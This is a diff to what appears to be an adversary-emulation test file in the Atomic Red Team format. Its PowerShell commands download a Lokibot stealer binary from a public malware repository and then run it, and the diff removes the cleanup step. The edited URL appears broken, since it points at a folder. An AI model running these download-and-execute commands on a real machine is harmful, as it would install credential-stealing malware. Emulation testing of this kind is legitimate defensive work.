@@ -11,13 +11,11 @@ atomic_tests:
       elevation_required: true
       command: |
         Write-Host "[*] Simulating download of lookbot.exe from public forum..."
-        $url = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Stealer/Lokibot.exe"
-        $out = "C:\Temp\lokibot.exe"
+        $url = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/master/Stealer/"
+        $out = "C:\Temp\Stealer\lokibot.exe"
         Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
 
         Write-Host "[+] lookbot .exe downloaded to $lookbot_exe"
-      cleanup_command: |
-        #Remove-Item "C:\Temp\lookbot.exe" -Force -ErrorAction SilentlyContinue
     attack_technique:
       - T1105
 
@@ -31,7 +29,7 @@ atomic_tests:
       elevation_required: true
       command: |
         Write-Host "[*] Simulating execution of lookbot.exe and Metasploit C2 connection..."
-        Start-Process -FilePath "C:\Temp\Lokibot.exe" -NoNewWindow
+        Start-Process -FilePath "C:\Temp\Stealer\lokibot.exe" -NoNewWindow
         Write-Host "[+] Meterpreter session established with attacker C2 server"
     attack_technique:
       - T1059.001
@@ -239,4 +237,5 @@ atomic_tests:
     attack_technique:
       - T1070.001
       - T1070.004
+
 
